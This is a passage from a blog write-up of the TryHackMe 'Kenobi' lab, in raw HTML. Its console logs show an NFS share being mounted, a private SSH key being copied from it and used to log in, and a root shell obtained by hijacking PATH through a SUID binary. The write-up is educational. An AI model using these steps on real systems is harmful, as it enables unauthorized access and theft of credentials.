</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo mkdir</span> /mnt/kenobi
<span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>mount 10.10.207.7:/var /mnt/kenobi
<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /mnt/kenobi
<span class="go">total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Jun 29 00:53 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
</span><span class="gp">lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -&gt;</span><span class="w"> </span>/run/lock
<span class="go">drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
</span><span class="gp">lrwxrwxrwx  1 root root       4 Sep  4  2019 run -&gt;</span><span class="w"> </span>/run
<span class="go">drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Jun 29 00:44 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
</span></pre></table></code></div></div><p>As shown above, we create a directory on our machine (<code class="language-plaintext highlighter-rouge">/mnt/kenobi</code>) to host the NFS. We then mount the NFS using the <code class="language-plaintext highlighter-rouge">mount</code> command, allowing us to access the server from our machine.</p><p>We can then copy the <code class="language-plaintext highlighter-rouge">id_rsa</code> key to our machine and use the <code class="language-plaintext highlighter-rouge">umount</code> command to remove the NFS from our machine:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo cp</span> /mnt/kenobi/tmp/id_rsa <span class="nb">.</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">sudo chmod </span>600 id_rsa
<span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>umount /mnt/kenobi
<span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>ssh <span class="nt">-i</span> id_rsa kenobi@10.10.207.7
<span class="go">The authenticity of host '10.10.56.162 (10.10.56.162)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.56.162' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
</span><span class="gp">To run a command as administrator (user "root"), use "sudo &lt;command&gt;</span><span class="s2">".
</span><span class="go">See "man sudo_root" for details.

</span><span class="gp">kenobi@kenobi:~$</span><span class="w"> 
</span></pre></table></code></div></div><p>We now have initial access on the target machine as the <code class="language-plaintext highlighter-rouge">kenobi</code> user. We can then view the <strong><code class="language-plaintext highlighter-rouge">user.txt</code> flag</strong> within the user’s <code class="language-plaintext highlighter-rouge">/home</code> directory:</p><p><img data-src="/assets/posts/20220629/user_txt.png" alt="" data-proofer-ignore></p><h2 id="task-4---privilege-escalation-with-path-variable-manipulation"><span class="mr-2">Task 4 - Privilege Escalation with Path Variable Manipulation</span><a href="#task-4---privilege-escalation-with-path-variable-manipulation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that we have initial access, we must escalate our privileges to gain root access. To do this, we are going to leverage SUID bits to perform <em>path variable manipulation</em>. Firstly, SUID bits are permissions set for users and groups and when set, can allow certain files to be executed on behalf of those user’s privileges.</p><p>Privileges in UNIX-based systems are set up as read, write, and execute (<code class="language-plaintext highlighter-rouge">rwx</code>). You can view those permissions when you run the <code class="language-plaintext highlighter-rouge">ls -la</code> command:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">kenobi@kenobi:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> user.txt
<span class="go">-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
</span></pre></table></code></div></div><p>As you can see there are <strong>3 distinct groups</strong> of permissions. The first group (<code class="language-plaintext highlighter-rouge">rw-</code>) denote the permissions set against the user. The second (<code class="language-plaintext highlighter-rouge">rw-</code>) denote the permissions set against the group. Finally, the third group (<code class="language-plaintext highlighter-rouge">rw-</code>) denote the permissions set against everyone else.</p><p>To understand SUID bits, we must also consider SGID and Sticky bits. Consider the following table:</p><div class="table-wrapper"><table><thead><tr><th>Permission<th>On Files<th>On Directories<tbody><tr><td>SUID bit<td>User executes the file with permissions of the <em>file</em> owner<td>N/A<tr><td>SGID bit<td>User executes the file with permission of the <em>group</em> owner<td>File created in directory gets the same group owner<tr><td>Sticky bit<td>N/A<td>Users are prevented from deleting files from other users</table></div><p>For example, a file created by the <code class="language-plaintext highlighter-rouge">root</code> user, with permissions <code class="language-plaintext highlighter-rouge">rwSrw-rw</code> means that users can execute the file with <code class="language-plaintext highlighter-rouge">root</code> privileges. As such, SUID bits can be very dangerous.</p><p>To find files which have this bit set, we can use the <code class="language-plaintext highlighter-rouge">find</code> command:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">kenobi@kenobi:~$</span><span class="w"> </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
<span class="go">/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
</span></pre></table></code></div></div><p>The above command will find all files (<code class="language-plaintext highlighter-rouge">-type f</code>, starting from the <code class="language-plaintext highlighter-rouge">/</code> directory with the SUID bit set for the user group (<code class="language-plaintext highlighter-rouge">-u=s</code>). It will also direct any errors to <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> to clean the output.</p><p>As shown, there are a lot of commands with the SUID bit set. In this case, we are looking for files which look like they have been created by the user or do not have the SUID bit set by default. In this case, <strong><code class="language-plaintext highlighter-rouge">/usr/bin/menu</code></strong> looks out of place. We can verify this by running the binary:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">kenobi@kenobi:~$</span><span class="w"> </span><span class="nb">cd</span> /usr/bin
<span class="gp">kenobi@kenobi:/usr/bin$</span><span class="w"> </span>./menu
<span class="go">
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
</span></pre></table></code></div></div><p>We can see <strong>3 options</strong>. When executed, the first runs the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>curl -I localhost
uname -r
ifconfig
</pre></table></code></div></div><p>At first glance, this may not look dangerous. However, as these commands do not run with a full path, i.e., <code class="language-plaintext highlighter-rouge">/usr/bin/curl</code> or <code class="language-plaintext highlighter-rouge">/usr/bin/uname</code>, we can leverage this and gain a root shell.</p><p>To do this, we can create a file with the name of <code class="language-plaintext highlighter-rouge">curl</code> or <code class="language-plaintext highlighter-rouge">uname</code> in a directory of our choice, give it full permissions, and append it to our PATH. When we execute the <code class="language-plaintext highlighter-rouge">menu</code> binary, it will use the file we created and execute it with <code class="language-plaintext highlighter-rouge">root</code> permissions, thus giving us a shell as the <code class="language-plaintext highlighter-rouge">root</code> user.</p><p><img data-src="/assets/posts/20220629/root_txt.png" alt="" data-proofer-ignore></p><p>In this case, we create a file called <code class="language-plaintext highlighter-rouge">curl</code> with the contents <code class="language-plaintext highlighter-rouge">/bin/sh</code>. When executed, the <code class="language-plaintext highlighter-rouge">menu</code> binary uses our path variable to find the <code class="language-plaintext highlighter-rouge">curl</code> binary, which is actually just our new file. It will then execute this file as the <code class="language-plaintext highlighter-rouge">root</code> user, giving us a shell. We can then read the <strong><code class="language-plaintext highlighter-rouge">root.txt</code> flag</strong> to complete the room.</p><h2 id="closing-remarks"><span class="mr-2">Closing Remarks</span><a href="#closing-remarks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>And that’s it! All done!</p><p>I hope you all enjoyed this room and learned a thing or two. I really am trying to up my game with these writeups and tutorials for my own learning and so I can share my knowledge with you.</p><p>If you want to keep up-to-date on what I do, follow me here:</p><ul><li><a href="https://twitter.com/0xV3R4X">Twitter</a><li><a href="https://github.com/0xv3r4x">GitHub</a></ul><p>Or you can also support me by buying me a coffee:</p><p><a href="https://www.buymeacoffee.com/v3r4x" target="_blank"><img data-src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: auto !important; width: auto !important;" data-proofer-ignore></a></p><p>Stay curious</p><p>- v3r4x</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/samba/" class="post-tag no-text-decoration" >samba</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >suid</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kenobi+Writeup+%7C+TryHackMe+-+v3r4x&url=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fkenobi-writeup-tryhackme%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kenobi+Writeup+%7C+TryHackMe+-+v3r4x&u=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fkenobi-writeup-tryhackme%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2F0xv3r4x.github.io%2Fposts%2Fkenobi-writeup-tryhackme%2F&text=Kenobi+Writeup+%7C+TryHackMe+-+v3r4x" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/brooklyn-nine-nine-writeup-tryhackme/">Brooklyn Nine Nine Writeup | TryHackMe</a><li><a href="/posts/ejpt-cheatsheet/">eJPT Cheatsheet</a><li><a href="/posts/internal-writeup-tryhackme/">Internal Writeup | TryHackMe</a><li><a href="/posts/alfred-writeup-tryhackme/">Alfred Writeup | TryHackMe</a><li><a href="/posts/hackpark-writeup-tryhackme/">HackPark Writeup | TryHackMe</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/beginner/">beginner</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/anonymous-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1656543600" data-df="ll" > Jun 30, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Anonymous Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview Welcome to my write-up for the Anonymous room on TryHackMe. Unlike other rooms, this has very little hand-holding, so you must have a good knowledge base and methodology before attemptin...</p></div></div></a></div><div class="card"> <a href="/posts/skynet-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1643241600" data-df="ll" > Jan 27, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Skynet Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview This is my writeup for the Skynet room on TryHackMe, a vulnerable Terminator themed Linux system. This will involve using nmap, gobuster, and smbclient to gather information and enumerat...</p></div></div></a></div><div class="card"> <a href="/posts/steel-mountain-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1643328000" data-df="ll" > Jan 28, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Steel Mountain Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview This is my writeup for the Steel Mountain room on TryHackMe. This room challenges you to exploit a Windows machine with, and without, metasploit. This is an easy room so if you are new ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/how-to-turn-your-raspberry-pi-into-a-nas/" class="btn btn-outline-primary" prompt="Older"><p>How to Turn your Raspberry Pi into a NAS</p></a> <a href="/posts/anonymous-writeup-tryhackme/" class="btn btn-outline-primary" prompt="Newer"><p>Anonymous Writeup | TryHackMe</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/0xv3r4x">v3r4x</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/beginner/">beginner</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
